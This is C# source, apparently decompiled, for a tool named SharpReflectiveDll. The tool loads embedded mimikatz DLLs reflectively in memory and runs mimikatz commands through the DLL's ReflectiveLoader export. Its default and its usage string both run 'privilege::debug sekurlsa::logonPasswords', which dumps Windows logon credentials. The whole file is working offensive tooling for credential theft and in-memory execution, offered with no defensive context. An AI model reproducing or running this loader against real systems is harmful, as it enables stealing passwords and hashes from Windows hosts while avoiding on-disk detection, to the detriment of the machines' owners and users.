using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SharpReflectiveDll
{
	// Token: 0x02000003 RID: 3
	public static class Program
	{
		// Token: 0x06000011 RID: 17 RVA: 0x0000287C File Offset: 0x00000A7C
		private static void Main(string[] args)
		{
			if (args.Length < 1)
			{
				Console.WriteLine("Usage: Sharp.exe privilege::debug sekurlsa::logonPasswords");
				return;
			}
			string text = string.Join(" ", args);
			Console.WriteLine(text);
			Console.WriteLine(Program.Command(text));
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000012 RID: 18 RVA: 0x000028AA File Offset: 0x00000AAA
		// (set) Token: 0x06000013 RID: 19 RVA: 0x000028B1 File Offset: 0x00000AB1
		private static byte[] PEBytes32 { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000014 RID: 20 RVA: 0x000028B9 File Offset: 0x00000AB9
		// (set) Token: 0x06000015 RID: 21 RVA: 0x000028C0 File Offset: 0x00000AC0
		private static byte[] PEBytes64 { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000016 RID: 22 RVA: 0x000028C8 File Offset: 0x00000AC8
		// (set) Token: 0x06000017 RID: 23 RVA: 0x000028CF File Offset: 0x00000ACF
		private static PE MimikatzPE { get; set; }

		// Token: 0x06000018 RID: 24 RVA: 0x000028D8 File Offset: 0x00000AD8
		public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords")
		{
			if (Program.MimikatzPE == null)
			{
				Assembly.GetExecutingAssembly().GetManifestResourceNames();
				if (IntPtr.Size == 4 && Program.MimikatzPE == null)
				{
					if (Program.PEBytes32 == null)
					{
						Program.PEBytes32 = Utilities.GetEmbeddedResourceBytes("mimikatz.x86.dll");
						if (Program.PEBytes32 == null)
						{
							return "";
						}
						Console.WriteLine("加载x86 Dll完成");
					}
					Program.MimikatzPE = PE.Load(Program.PEBytes32);
				}
				else if (IntPtr.Size == 8 && Program.MimikatzPE == null)
				{
					if (Program.PEBytes64 == null)
					{
						Program.PEBytes64 = Utilities.GetEmbeddedResourceBytes("mimikatz.x64.dll");
						if (Program.PEBytes64 == null)
						{
							return "";
						}
						Console.WriteLine("Load x64 Dll OK");
					}
					Program.MimikatzPE = PE.Load(Program.PEBytes64);
				}
			}
			if (Program.MimikatzPE == null)
			{
				return "";
			}
			IntPtr functionExport = Program.MimikatzPE.GetFunctionExport("ReflectiveLoader");
			if (functionExport == IntPtr.Zero)
			{
				return "";
			}
			Program.MimikatzType mimikatzType = (Program.MimikatzType)Marshal.GetDelegateForFunctionPointer(functionExport, typeof(Program.MimikatzType));
			IntPtr command = Marshal.StringToHGlobalUni(Command);
			string result;
			try
			{
				result = Marshal.PtrToStringUni(mimikatzType(command));
			}
			catch (Exception ex)
			{
				Console.Error.WriteLine("MimikatzException: " + ex.Message + ex.StackTrace);
				result = "";
			}
			return result;
		}

		// Token: 0x02000011 RID: 17
		// (Invoke) Token: 0x0600002B RID: 43
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate IntPtr MimikatzType(IntPtr command);
	}
}
